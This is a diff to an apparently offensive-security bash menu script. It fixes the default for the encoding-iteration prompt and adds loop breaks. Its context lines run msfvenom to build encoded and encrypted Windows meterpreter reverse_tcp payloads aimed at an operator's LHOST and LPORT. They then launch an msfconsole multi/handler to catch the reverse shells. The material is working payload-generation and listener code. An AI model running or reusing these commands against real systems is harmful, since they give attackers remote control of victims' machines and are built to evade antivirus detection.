@@ -10321,11 +10321,12 @@ while true; do
 					do
 						echo "Digit how many iterations of encoding"
 						read -p "(default, 10): " -i "10" ITE
-						if [[ "$ITE" =~ ^[0-9]+$ ]];
+						if [[ "$ITE" == "" ]];
 						then
+							ITE="10"
+						fi
 							msfvenom -p windows/meterpreter/reverse_tcp -ax86 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT -o revshell_32bit.$EXT
 							msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
-						fi
 						break
 					done
 					break
@@ -10348,11 +10349,12 @@ while true; do
 					do
 						echo "Digit how many iterations of encoding"
 						read -p "(default, 10): " -i "10" ITE
-						if [[ "$ITE" =~ ^[0-9]+$ ]];
+						if [[ "$ITE" == "" ]];
 						then
+							ITE="10"
+						fi
 							msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -e $ENC -i $ITE -f $EXT LHOST=$MIP LPORT=$MPRT -o revshell_64bit.$EXT
 							msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST ""$MIP""; set LPORT ""$MPRT""; exploit"
-						fi
 						break
 					done
 					break
@@ -10405,10 +10407,15 @@ while true; do
 									PSSP=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 128)
 								fi
 								msfvenom -p "$PAY" -a "$ARC" -e "$ENC" -i "$ITE" --encrypt "$CRYP" --encrypt-key "$PSSP" -f "$FORM" LHOST="$MIP" LPORT="$MPRT" -o payload.$FORM
+								break
 							done
+							break
 						done
+						break
 					done
+					break
 				done
+				break
 			done
 		fi
 	;;
